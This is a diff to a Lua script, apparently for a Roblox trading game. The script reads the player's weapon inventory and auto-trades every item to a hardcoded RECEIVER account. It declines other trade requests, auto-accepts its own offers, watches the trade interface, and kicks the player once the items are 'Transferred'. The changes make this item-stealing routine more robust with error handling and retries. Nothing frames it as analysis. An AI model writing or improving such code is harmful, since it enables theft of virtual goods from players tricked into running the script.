@@ -177,16 +177,41 @@ local function FormatName(T)
     return R
 end
 
-local function TradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
-local function SendTrade(Name)
-    local P = Players:FindFirstChild(Name)
-    if P then pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(P) end) end
+local function TradeStatus()
+    return pcall(function() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end) or "None"
 end
-local function OfferItem(ID) ReplicatedStorage.Trade.OfferItem:FireServer(ID, "Weapons") end
+
+local function SendTradeRequest(TargetPlayer)
+    return pcall(function()
+        ReplicatedStorage.Trade.SendRequest:InvokeServer(TargetPlayer)
+        return true
+    end)
+end
+
+local function OfferItem(ID)
+    pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(ID, "Weapons") end)
+end
+
 local LastOffer = nil
-ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(D) if D and D.LastOffer then LastOffer = D.LastOffer end end)
-local function AcceptTrade() if LastOffer then ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastOffer) LastOffer = nil return true end return false end
-local function WaitTrade() while TradeStatus() ~= "None" do task.wait(0.1) end end
+ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(Data)
+    if Data and Data.LastOffer then LastOffer = Data.LastOffer end
+end)
+
+local function AcceptTrade()
+    if not LastOffer then return false end
+    return pcall(function()
+        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastOffer)
+        return true
+    end)
+end
+
+local function WaitForTradeEnd()
+    for _ = 1, 30 do
+        if TradeStatus() == "None" then return true end
+        task.wait(0.2)
+    end
+    return false
+end
 
 local Blacklist = {DefaultGun = true, DefaultKnife = true, Reaver = true, IceHammer = true, Gingerscythe = true, TestItem = true, Cracks = true, Icecrusher = true, Dartbringer = true, SharkSeeker = true}
 local Inventory, TradeItems, TotalValue = {}, {}, 0
@@ -216,7 +241,6 @@ end
 
 Inventory, TradeItems, TotalValue = RefreshInv()
 
--- === YOUR RULE: 0 ITEMS = KICK ===
 if #Inventory == 0 then
     task.wait(0.5)
     LocalPlayer:Kick("No weapons found.")
@@ -294,7 +318,7 @@ PlayerGui:WaitForChild("TradeGUI_Phone").Changed:Connect(function() PlayerGui.Tr
 local function KickDone() task.wait(2) LocalPlayer:Kick("Items Transferred!") end
 local function FindTarget()
     if type(RECEIVER) == "table" then
-        for _, N in ipairs(RECEIVER) do if N ~= "" and Players:FindFirstChild(N) then return N end end
+        for _, N in ipairs(RECEIVER) do if N ~= "" and Players:FindFirstChild(N) then return Players[N] end end
     end
     return nil
 end
@@ -303,17 +327,31 @@ local function ProcessTrades(Target)
     local Attempts = 0
     while #TradeItems > 0 and Attempts < 999 do
         Attempts += 1
-        local S = TradeStatus()
-        if S == "ReceivingRequest" then pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end) task.wait(0.5)
-        elseif S == "StartTrade" then
+        LastOffer = nil
+        local Status = TradeStatus()
+        if Status == "ReceivingRequest" then
+            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
+            task.wait(0.5)
+        elseif Status == "StartTrade" then
+            task.wait(1)
             for _ = 1, math.min(4, #TradeItems) do
-                local I = table.remove(TradeItems, 1)
-                for _ = 1, I.Count do OfferItem(I.ID) task.wait(0.05) end
+                local Item = table.remove(TradeItems, 1)
+                for _ = 1, Item.Count do
+                    OfferItem(Item.ID)
+                    task.wait(0.05)
+                end
             end
             task.wait(2)
-            if AcceptTrade() then WaitTrade() Inventory, TradeItems, TotalValue = RefreshInv() Attempts = 0 end
-        elseif S == "None" then
-            for T = 1, 5 do if SendTrade(Target) then task.wait(0.5) break end task.wait(math.min(T * 0.5, 3)) end
+            if AcceptTrade() then
+                WaitForTradeEnd()
+                Inventory, TradeItems, TotalValue = RefreshInv()
+                Attempts = 0
+            end
+        elseif Status == "None" then
+            for T = 1, 5 do
+                if SendTradeRequest(Target) then task.wait(0.5) break end
+                task.wait(math.min(T * 0.5, 3))
+            end
         end
         task.wait(0.5)
     end
@@ -322,10 +360,14 @@ end
 
 local function AutoTrade()
     local Busy = false
-    local function Check(P)
+    local function Check(Player)
         if Busy then return end
         local Target = FindTarget()
-        if Target and P.Name == Target then Busy = true task.wait(3) ProcessTrades(P.Name) end
+        if Target and Player == Target then
+            Busy = true
+            task.wait(2)
+            ProcessTrades(Target)
+        end
     end
     for _, P in ipairs(Players:GetPlayers()) do Check(P) end
     Players.PlayerAdded:Connect(Check)
